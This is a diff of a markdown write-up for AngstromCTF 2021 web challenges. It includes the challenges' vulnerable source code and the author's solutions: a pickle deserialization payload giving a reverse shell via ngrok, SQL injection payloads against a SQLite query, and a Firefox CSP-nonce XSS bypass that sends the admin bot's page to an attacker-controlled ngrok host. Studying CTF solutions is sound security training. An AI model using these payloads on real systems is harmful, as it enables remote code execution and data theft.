@@ -28,35 +28,38 @@ flag = os.environ.get('FLAG', 'actf{FAKE_FLAG}')
 
 @app.route('/pickle.jpg')
 def bg():
-	return send_file('pickle.jpg')
+    return send_file('pickle.jpg')
 
 @app.route('/')
 def jar():
-	contents = request.cookies.get('contents')
-	if contents: items = pickle.loads(base64.b64decode(contents))
-	else: items = []
-	return '<form method="post" action="/add" style="text-align: center; width: 100%"><input type="text" name="item" placeholder="Item"><button>Add Item</button><img style="width: 100%; height: 100%" src="/pickle.jpg">' + \
-		''.join(f'<div style="background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;">{item}</div>' for item in items)
+    contents = request.cookies.get('contents')
+    if contents: items = pickle.loads(base64.b64decode(contents))
+    else: items = []
+    return '<form method="post" action="/add" style="text-align: center; width: 100%"><input type="text" name="item" placeholder="Item"><button>Add Item</button><img style="width: 100%; height: 100%" src="/pickle.jpg">' + \
+        ''.join(f'<div style="background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;">{item}</div>' for item in items)
 
 @app.route('/add', methods=['POST'])
 def add():
-	contents = request.cookies.get('contents')
-	if contents: items = pickle.loads(base64.b64decode(contents))
-	else: items = []
-	items.append(request.form['item'])
-	response = make_response(redirect('/'))
-	response.set_cookie('contents', base64.b64encode(pickle.dumps(items)))
-	return response
+    contents = request.cookies.get('contents')
+    if contents: items = pickle.loads(base64.b64decode(contents))
+    else: items = []
+    items.append(request.form['item'])
+    response = make_response(redirect('/'))
+    response.set_cookie('contents', base64.b64encode(pickle.dumps(items)))
+    return response
 
 app.run(threaded=True, host="0.0.0.0")
 ```
 
 Given the challenge name and all those pickles, one can immediatly assume we're talking about [python's pickle module.](https://docs.python.org/3/library/pickle.html)
 Particularly, the line
+
 ```python
 if contents: items = pickle.loads(base64.b64decode(contents))
 ```
+
 seems interesting. If an user makes a request to the page, the application will try to get the cookie `contents` and try to deserialize it using the pickle module. Unpickling user controlled inputs is known to be dangerous hence we can try to craft a payload that, when deserialized, gives us RCE.
+
 ```python
 #!/usr/bin/python
 import random
@@ -83,6 +86,7 @@ print("[*] Using payload %s" % contents)
 # trigger remote pickle.loads with our payload
 r = requests.get('https://jar.2021.chall.actf.co/', cookies={'contents' : contents}, verify=False)
 ```
+
 The idea behind this attack is to use a special function `__reduce__` in our crafted `Pwned` class. In this way, when we serialize the class, the `__reduce__` function will return a tuple with a callable object and a list of arguments. When unpickled, the class will execute the callable object using the parameters provided in `__reduce__`. Learn more about [python __reduce__ function.](https://docs.python.org/3/library/pickle.html#object.__reduce__)
 
 The solution we found it quite an overkill; when submitted, the payload triggers a reverse shell on the remote webserver. That said, we can setup a ngrok tunnel on our local machine that forwards the connections to a netcat server and get the shell.
@@ -95,6 +99,7 @@ The solution we found it quite an overkill; when submitted, the payload triggers
 > Come check out our finest selection of quills!<br>Author: JoshDaBosh
 
 We are given the source code of the application.
+
 ```ruby
 require 'sinatra'
 require 'sqlite3'
@@ -103,51 +108,57 @@ set :bind, "0.0.0.0"
 set :port, 4567
 
 get '/' do
-	db = SQLite3::Database.new "quills.db"
-	@row = db.execute( "select * from quills" )
+    db = SQLite3::Database.new "quills.db"
+    @row = db.execute( "select * from quills" )
 
-	erb :index
+    erb :index
 end
 
 get '/quills' do
-	erb :quills
+    erb :quills
 end
 
 
 post '/quills' do
-	db = SQLite3::Database.new "quills.db"
-	cols = params[:cols]
-	lim = params[:limit]
-	off = params[:offset]
+    db = SQLite3::Database.new "quills.db"
+    cols = params[:cols]
+    lim = params[:limit]
+    off = params[:offset]
 
-	blacklist = ["-", "/", ";", "'", "\""]
-	blacklist.each { |word|
-		if cols.include? word
-			return "beep boop sqli detected!"
-		end
-	}
+    blacklist = ["-", "/", ";", "'", "\""]
+    blacklist.each { |word|
+        if cols.include? word
+            return "beep boop sqli detected!"
+        end
+    }
 
-	if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
-		return "bad, no quills for you!"
-	end
+    if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
+        return "bad, no quills for you!"
+    end
 
-	@row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])
+    @row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])
 
-	p @row
-	erb :specific
+    p @row
+    erb :specific
 end
 ```
+
 We're talking about an webapp written in ruby using sinatra. The interesting stuff happens in `/quills`. As you can see, the application uses a simple `SQLite` database to query for some sort of _Sea quills_. The inputs are `cols`, `lim` and `off`, all of which form the following sql query:
+
 ```sql
 select {cols} from quills limit {lim} offset {offset}
 ```
+
 We can certainly control all three of the inputs, with some limitations though.
+
 1. `cols` cannot contain word in `["-", "/", ";", "'", "\""]`
 2. `lim` and `off` should <u>apparently</u> be numbers. (Why apparently ? See [part 2](#sea-of-quills-2))
 
 At this point, let's try some SQLi injections to see if there's something hidden in the database.
 Let's see what's in `sql_master`, maybe some hidden tables ?
-![angstrom_ctf](/assets/img/AngstromCTF_2021/web_2.jpeg)
+
+![angstrom_ctf](/assets/img/AngstromCTF_2021/web_2.jpeg){: .image-full }
+
 ```html
 <ul class="list pl0">
 
@@ -162,8 +173,10 @@ Let's see what's in `sql_master`, maybe some hidden tables ?
 
 </ul>
 ```
+
 Bingo, we have a table named `flagtable`. I wonder what's in there.
 Let's craft this payload `limit = 3`, `offset = 0`, `cols = * from flagtable union select 1`.
+
 ```html
 <ul class="list pl0">
 
@@ -175,6 +188,7 @@ Let's craft this payload `limit = 3`, `offset = 0`, `cols = * from flagtable uni
 
 </ul>
 ```
+
 PS: Why `* from flagtable union select 1` ? Because we know that the `quills` table has 3 columns and the `flagtable` table has 1 column hence the only way to make `union select` work is by joining together the same number of columns of both the tables. All of this because I'm lazy enough to not dump the column names of `flagtable` so by using `*` on it I have to try `union select 1, 2, 3 ...` until I get the right result.
 
 🏁 __actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}__{:.spoiler}
@@ -195,37 +209,37 @@ set :port, 4567
 set :environment, :production
 
 get '/' do
-	db = SQLite3::Database.new "quills.db"
-	@row = db.execute( "select * from quills" )
+    db = SQLite3::Database.new "quills.db"
+    @row = db.execute( "select * from quills" )
 
-	erb :index
+    erb :index
 end
 
 get '/quills' do
-	erb :quills
+    erb :quills
 end
 
 post '/quills' do
-	db = SQLite3::Database.new "quills.db"
-	cols = params[:cols]
-	lim = params[:limit]
-	off = params[:offset]
+    db = SQLite3::Database.new "quills.db"
+    cols = params[:cols]
+    lim = params[:limit]
+    off = params[:offset]
 
-	blacklist = ["-", "/", ";", "'", "\"", "flag"]
+    blacklist = ["-", "/", ";", "'", "\"", "flag"]
 
-	blacklist.each { |word|
-		if cols.include? word
-			return "beep boop sqli detected!"
-		end
-	}
+    blacklist.each { |word|
+        if cols.include? word
+            return "beep boop sqli detected!"
+        end
+    }
 
-	if cols.length > 24 || !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
-		return "bad, no quills for you!"
-	end
+    if cols.length > 24 || !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
+        return "bad, no quills for you!"
+    end
 
-	@row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])
-	p @row
-	erb :specific
+    @row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])
+    p @row
+    erb :specific
 end
 ```
 
@@ -261,6 +275,7 @@ while 1:
             index += 1
             break
 ```
+
 Using this approach, the offset becomes `0 or 1` = `1` only when we get the correct n-th char of the flag hence changing the offset of the query from 0 to 1 changes the ouput of the query on the page. Based on the yielded html we can check if the char we're trying is correct or if we should try the next one.
 
 PS: the quill record with `desc = 'it's very special'` is at offset 1 so when we get it the response we know we got the correct n-th character.
@@ -274,6 +289,7 @@ PSS: Oooor we could just use `* from fLagtable\x00` as `cols`'s param and get th
 > I've made a new game that is sure to make all the Venture Capitalists want to invest! Care to try it out?<br>Author: paper
 
 We are given this source code.
+
 ```javascript
 const visiter = require('./visiter');
 
@@ -294,136 +310,148 @@ const shares = new Map();
 shares['hint'] = {name: '<marquee>helvetica standard</marquee>', score: 42};
 
 app.post('/record', function (req, res) {
-	if (req.body.name > 100) {
-		return res.status(400).send('your name is too long! we don\'t have that kind of vc investment yet...');
-	}
+    if (req.body.name > 100) {
+        return res.status(400).send('your name is too long! we don\'t have that kind of vc investment yet...');
+    }
 
-	if (isNaN(req.body.score) || !req.body.score || req.body.score < 1) {
-		res.send('your score has to be a number bigger than 1! no getting past me >:(');
-		return res.status(400).send('your score has to be a number bigger than 1! no getting past me >:(');
-	}
+    if (isNaN(req.body.score) || !req.body.score || req.body.score < 1) {
+        res.send('your score has to be a number bigger than 1! no getting past me >:(');
+        return res.status(400).send('your score has to be a number bigger than 1! no getting past me >:(');
+    }
 
-	const name = req.body.name;
-	const score = req.body.score;
-	const shareName = crypto.randomBytes(8).toString('hex');
+    const name = req.body.name;
+    const score = req.body.score;
+    const shareName = crypto.randomBytes(8).toString('hex');
 
-	shares[shareName] = { name, score };
+    shares[shareName] = { name, score };
 
-	return res.redirect(`/shares/${shareName}`);
+    return res.redirect(`/shares/${shareName}`);
 })
 
 app.get('/shares/:shareName', function(req, res) {
-	// TODO: better page maybe...? would attract those sweet sweet vcbucks
-	if (!(req.params.shareName in shares)) {
-		return res.status(400).send('hey that share doesn\'t exist... are you a time traveller :O');
-	}
+    // TODO: better page maybe...? would attract those sweet sweet vcbucks
+    if (!(req.params.shareName in shares)) {
+        return res.status(400).send('hey that share doesn\'t exist... are you a time traveller :O');
+    }
 
-	const share = shares[req.params.shareName];
-	const score = share.score;
-	const name = share.name;
-	const nonce = crypto.randomBytes(16).toString('hex');
-	let extra = '';
+    const share = shares[req.params.shareName];
+    const score = share.score;
+    const name = share.name;
+    const nonce = crypto.randomBytes(16).toString('hex');
+    let extra = '';
 
-	if (req.cookies.no_this_is_not_the_challenge_go_away === nothisisntthechallenge) {
-		extra = `deletion token: <code>${process.env.FLAG}</code>`
-	}
+    if (req.cookies.no_this_is_not_the_challenge_go_away === nothisisntthechallenge) {
+        extra = `deletion token: <code>${process.env.FLAG}</code>`
+    }
 
-	return res.send(`
+    return res.send(`
 <!DOCTYPE html>
 <html>
-	<head>
-		<meta http-equiv='Content-Security-Policy' content="script-src 'nonce-${nonce}'">
-		<title>snek nomnomnom</title>
-	</head>
-	<body>
-		${extra}${extra ? '<br /><br />' : ''}
-		<h2>snek goes <em>nomnomnom</em></h2><br />
-		Check out this score of ${score}! <br />
-		<a href='/'>Play!</a> <button id='reporter'>Report.</button> <br />
-		<br />
-		This score was set by ${name}
-		<script nonce='${nonce}'>
+    <head>
+        <meta http-equiv='Content-Security-Policy' content="script-src 'nonce-${nonce}'">
+        <title>snek nomnomnom</title>
+    </head>
+    <body>
+        ${extra}${extra ? '<br /><br />' : ''}
+        <h2>snek goes <em>nomnomnom</em></h2><br />
+        Check out this score of ${score}! <br />
+        <a href='/'>Play!</a> <button id='reporter'>Report.</button> <br />
+        <br />
+        This score was set by ${name}
+        <script nonce='${nonce}'>
 function report() {
-	fetch('/report/${req.params.shareName}', {
-		method: 'POST'
-	});
+    fetch('/report/${req.params.shareName}', {
+        method: 'POST'
+    });
 }
 
 document.getElementById('reporter').onclick = () => { report() };
-		</script>
+        </script>
 
-	</body>
+    </body>
 </html>`);
 });
 
 app.post('/report/:shareName', async function(req, res) {
-	if (!(req.params.shareName in shares)) {
-		return res.status(400).send('hey that share doesn\'t exist... are you a time traveller :O');
-	}
+    if (!(req.params.shareName in shares)) {
+        return res.status(400).send('hey that share doesn\'t exist... are you a time traveller :O');
+    }
 
-	await visiter.visit(
-		nothisisntthechallenge,
-		`http://localhost:9999/shares/${req.params.shareName}`
-	);
+    await visiter.visit(
+        nothisisntthechallenge,
+        `http://localhost:9999/shares/${req.params.shareName}`
+    );
 })
 
 app.listen(9999, '0.0.0.0');
 ```
+
 And we also have a bot that auto-visits  webpages.
+
 ```javascript
 const puppeteer = require('puppeteer')
 const fs = require('fs')
 
 async function visit(secret, url) {
-	const browser = await puppeteer.launch({ args: ['--no-sandbox'], product: 'firefox' })
-	var page = await browser.newPage()
-	await page.setCookie({
-		name: 'no_this_is_not_the_challenge_go_away',
-		value: secret,
-		domain: 'localhost',
-		samesite: 'strict'
-	})
-	await page.goto(url)
+    const browser = await puppeteer.launch({ args: ['--no-sandbox'], product: 'firefox' })
+    var page = await browser.newPage()
+    await page.setCookie({
+        name: 'no_this_is_not_the_challenge_go_away',
+        value: secret,
+        domain: 'localhost',
+        samesite: 'strict'
+    })
+    await page.goto(url)
 
-	// idk, race conditions!!! :D
-	await new Promise(resolve => setTimeout(resolve, 500));
-	await page.close()
-	await browser.close()
+    // idk, race conditions!!! :D
+    await new Promise(resolve => setTimeout(resolve, 500));
+    await page.close()
+    await browser.close()
 }
 
 module.exports = { visit }
 ```
 
 Let's try to extract the interesting lines from this source code. The logic is simple:
+
 1. You post a JSON to `/record` with your name and score.
 2. The application creates an unique `/share/:shareName` for you.
 3. You can use `/report/:shareName` to report your share to the admin (the bot).
 
 Upon reporting, the bot is going to visit your share's page. Let's look for some sort of XSS sink point. We can notice that the name we pass at `/record` is used on our share page without any particular escaping.
+
 ```javascript
 " ... This score was set by ${name} ... "
 ```
+
 Also, the flag is printed on the page only if we have admin's secret cookie.
+
 ```javascript
 if (req.cookies.no_this_is_not_the_challenge_go_away === nothisisntthechallenge) {
     extra = `deletion token: <code>${process.env.FLAG}</code>`
 }
 ```
+
 Finally, there is a CSP header on the page:
+
 ```html
 <meta http-equiv='Content-Security-Policy' content="script-src 'nonce-${nonce}'">
 ```
+
 The idea could be the following:
+
 1. Submit an evil share containing a XSS payload in the `name` parameter
 2. Report the created share to the bot
 3. Use the XSS to steal the html document from the admin's browser
 
 Let's first of all try to check what browser is used by the bot.
 By submitting the following payload we can see the bot is pinging back our webhook.
+
 ```python
 # ping ngrok local instance
 data = {"score" : "123", "name" : '<img src="https://8c68790a251f.ngrok.io"/>'}
 ```
+
 ```bash
 Connection from 127.0.0.1:58110
 GET / HTTP/1.1
@@ -441,13 +469,16 @@ X-Forwarded-For: 52.207.14.64
 ```
 
 So we know the bot uses `Firefox/89.0` as a browser. Let's try some basic script injection XSS by submitting the following payload and by trying to see it in our Firefox browser.
- ```python
+
+```python
 data = {"score" : "123", "name" : '<script>alert(1)</script>'}
 ```
-![angstrom_ctf](/assets/img/AngstromCTF_2021/web_4.jpeg)
+
+![angstrom_ctf](/assets/img/AngstromCTF_2021/web_4.jpeg){: .image-full }
 Hmm, seems like the CSP is blocking our script's execution. This happens because we didn't provide a valid nonce for the script tag hence the browser refuses to execute it. After some research I found [this post](https://krial057.github.io/blog/own-xss-challenge) explaining why using `<script src=//evil.com/script.js` can work in our case. Basically, as the XSS sink point is printed on the page just before the valid `<script nonce={nonce}>` tag, if we inject `<script attr=value attr=value ...` without closing the tag, firefox reuses the nonce from the script tag situated immediately after our payload.
-![angstrom_ctf](/assets/img/AngstromCTF_2021/web_5.jpeg)
+![angstrom_ctf](/assets/img/AngstromCTF_2021/web_5.jpeg){: .image-full }
 That's some good news for us as it gives us carte blanche on what we can execute on the bot's browser. We can use the following script to setup a form with a single input, set it's value to admin's page html document and send it back to our local server.
+
 ```python
 #!/usr/bin/python
 import requests
@@ -470,5 +501,7 @@ print(token)
 # report
 r = requests.post("http://nomnomnom.2021.chall.actf.co/report/{}".format(token), verify=False)
 ```
+
 ![angstrom_ctf](/assets/img/AngstromCTF_2021/web_6.jpeg)
+
 🏁 __actf{w0ah_the_t4g_n0mm3d_th1ng5}__{:.spoiler}
